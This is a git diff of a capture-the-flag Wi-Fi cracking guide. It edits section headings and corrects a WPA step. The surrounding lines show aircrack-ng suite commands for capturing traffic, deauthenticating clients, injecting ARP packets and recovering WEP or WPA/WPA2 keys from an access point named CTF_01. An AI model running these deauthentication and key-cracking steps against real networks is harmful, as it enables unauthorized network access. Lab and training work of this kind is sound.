@@ -71,7 +71,7 @@ The access point must be broadcasting data for this to work. This attack works b
   5) Inject the arp packet using `aireplay-ng -2`.
   6) Run `aircrack-ng` to obtain the WEP key.
 
-### WEP SKA with client
+### WEP SKA with connected client
 WEP access point configured to Shared-Key Authentication (SKA) with client. Use a `while true` loop for deauthenticating the client.
 
 1) Monitor and capture the target network traffic.
@@ -92,14 +92,14 @@ $ aireplay-ng -3 -e CTF_01 wlan0mon
 ```
 5) Run `aircrack-ng` to obtain the WEP key.
 
-### WPA/WPA2 PSK with clients
+### WPA/WPA2 PSK with connected client
 Steps to perform an attack on a WPA/WPA2 access point with clients. The pre-shared (PSK) must be in the wordlists used. There is a bug in versions older than 1.5 where this will fail.
 
 1) Monitor and capture the target network traffic.
 ```code
 $ airodump-ng wlan0mon -c 6 -e CTF_01 -w capture
 ```
-2) Force the connected client to deauthenticate to capture the PRGA XOR keystream.
+2) Force the connected client to deauthenticate to capture the handshake(s).
 ```code
 $ aireplay-ng -0 3 -e CTF_01 -c client_mac wlan0mon
 ```
